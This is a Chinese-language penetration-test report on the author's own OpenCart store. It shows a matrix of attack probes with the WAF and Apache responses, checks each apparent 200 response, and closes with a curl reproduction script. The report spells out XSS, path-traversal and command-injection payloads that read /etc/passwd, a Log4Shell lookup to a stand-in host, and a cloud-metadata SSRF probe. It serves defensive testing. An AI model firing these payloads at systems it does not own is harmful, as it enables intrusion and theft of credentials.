# OpenCart 安全测试：第一层应用层攻击模拟（自有资产渗透测试）

对自有电商站（CloudFront + WAF + 私有 ALB + ASG + OpenCart）做应用层攻击模拟，验证加固效果。基于 **OWASP Top 10 2025** 攻击矩阵。

> ⚠️ 仅对自有资产测试。所有敏感值（域名、账号、IP、资源 ID）已脱敏/占位。
> 判读方法：响应头 `server: CloudFront` = **WAF 边缘拦截**；`server: Apache` = **实例层（httpd 加固）拦截**；404 = 应用路由不接受。

---

## 攻击结果矩阵

| 攻击类型 | Payload 示例 | 结果 | 拦截层 |
|---|---|---|---|
| **XSS** | `<script>alert(1)</script>` / `<img src=x onerror=>` / `<svg/onload=>` | **403** | WAF (CommonRuleSet) |
| **路径穿越/LFI** | `../../../../etc/passwd`（含 URL 编码 `..%2f`）| **403** | WAF |
| **超长 Host 头** | Host: 5000 字符 | **403** | WAF |
| **恶意扫描器 UA** | `sqlmap/1.7`、`Nikto` | **403** | WAF (KnownBadInputs) |
| **Log4Shell** | `${jndi:ldap://evil/a}` | **403** | WAF |
| **SSRF（云元数据）** | `?url=http://169.254.169.254/latest/meta-data/` | **403** | WAF |
| **敏感文件探测** | `config.php` / `.env` / `system/storage/logs/error.log` / `admin/config.php` / `system/config/default.php` / `composer.json` | **403** | Apache（实例加固层）|
| **SQL 注入** | `UNION SELECT`、`' OR 1=1` | **404** | 应用路由不接受，无注入点 |
| **HTTP TRACE/TRACK** | TRACE / TRACK 方法 | **405 / 403** | Apache / WAF |
| **admin 未授权** | `/admin/`（从非白名单 IP）| **403** | WAF (IP 白名单) |

---

## "看似 200" 的几项 —— 逐个验证均非漏洞

测试中有几个返回 200，容易误判为漏洞，逐个查证后确认**都不是**：

1. **命令注入 `?x=;cat /etc/passwd` → 200**：返回正常首页（`<title>Your Store</title>`）。参数 `x=` 未进入任何执行点，OpenCart 把未知参数当正常请求。**无命令执行**。
2. **SQL sleep 盲注 → 200**：`search` 参数走参数化查询，未触发延迟，正常返回。**无盲注**。
3. **PUT/DELETE/OPTIONS → 200**：实测 **PUT 一个文件后 GET 返回 404** —— 未真正写入。OpenCart 无 WebDAV，PUT 不落地，200 只是返回首页 HTML。**无文件写入漏洞**。
4. **admin/ → 200（仅白名单 IP）**：因测试机 IP 在 admin WAF 白名单内，属预期。非白名单 IP 访问返回 403。

> 教训：**看 HTTP 状态码不够，200 可能只是"返回首页"**。必须结合响应体（是否泄露 `/etc/passwd`、是否真写入文件、是否有 SQL 延迟）判断是否真被利用。

---

## 结论

**两层 + 应用层防御全部生效，未发现任何真实可利用漏洞：**

1. **WAF（CloudFront 边缘）**：拦下 XSS、路径穿越、SSRF、Log4Shell、恶意扫描器、超长 header —— OWASP 主要注入/攻击类全部 403。
2. **实例层加固（Apache httpd）**：拦下所有敏感文件探测（config/.env/error.log 等）。
3. **应用层（OpenCart）**：参数化查询 + 路由校验，SQLi/命令注入无落点。
4. **admin IP 白名单**：非白名单来源 403。

---

## 复现命令片段

```bash
D=https://<YOUR_DOMAIN>
probe(){ curl -sS -o /dev/null -w "%{http_code}" "$@" --max-time 15; }
# XSS
probe "$D/?search=<script>alert(1)</script>"
# 路径穿越
probe "$D/?file=../../../../etc/passwd"
# 敏感文件
probe "$D/config.php"; probe "$D/system/storage/logs/error.log"
# 恶意 UA
probe -A "sqlmap/1.7" "$D/"
# Log4Shell
probe "$D/?x=\${jndi:ldap://evil.com/a}"
# 判读: 响应头 server=CloudFront(WAF拦) / Apache(实例层拦)
curl -sS -D - -o /dev/null "$D/?search=<script>alert(1)</script>" | grep -i server
```

> 注：WAF 的 CloudWatch `BlockedRequests` metric 有几分钟聚合延迟，测试当下可能显示 0；实际拦截以响应头 `server: CloudFront` + 403 为准。

---

*第二层（EC2 流量/CC 压力攻击）需先核对 AWS Simulated Events / 压力测试政策后再进行。本报告仅覆盖第一层应用层攻击。*
